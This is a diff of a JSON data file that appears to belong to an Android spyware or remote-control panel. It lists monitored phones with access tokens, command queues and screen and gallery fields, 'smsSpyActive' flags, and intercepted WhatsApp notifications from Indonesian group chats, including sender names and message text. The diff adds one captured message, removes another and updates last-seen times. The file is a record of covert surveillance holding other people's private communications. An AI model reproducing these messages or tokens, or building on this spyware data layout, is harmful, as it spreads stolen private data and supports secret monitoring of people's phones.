@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776780339676,
+    "lastSeen": 1776780351616,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB byone/mabar ff 8a (5 pesan): ~ Alya💤",
+        "content": "💟 Stiker",
+        "time": "21/04 21:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776780352211
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 20:39",
         "pkg": "com.whatsapp",
         "receivedAt": 1776778750959
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || MANZZ KALBAR (969 pesan): ~ Biaan_",
-        "content": "📷 COD kan\nLog Google bind tw sepaket",
-        "time": "21/04 20:39",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776778750942
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776780341268,
+    "lastSeen": 1776780350498,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776780342351,
+    "lastSeen": 1776780351356,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
